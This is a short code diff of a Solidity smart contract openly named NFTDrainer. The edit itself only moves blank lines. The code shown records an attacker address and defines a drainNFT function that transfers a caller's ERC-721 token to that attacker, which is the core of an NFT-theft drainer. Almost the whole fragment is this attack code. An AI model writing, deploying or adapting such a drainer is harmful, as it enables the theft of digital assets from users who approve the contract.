@@ -10,8 +10,9 @@ contract NFTDrainer {
         attacker = msg.sender;
     }
 
-
     function drainNFT(address nftContract, uint256 tokenId) external {
         IERC721(nftContract).transferFrom(msg.sender, attacker, tokenId);
     }
 }
+
+
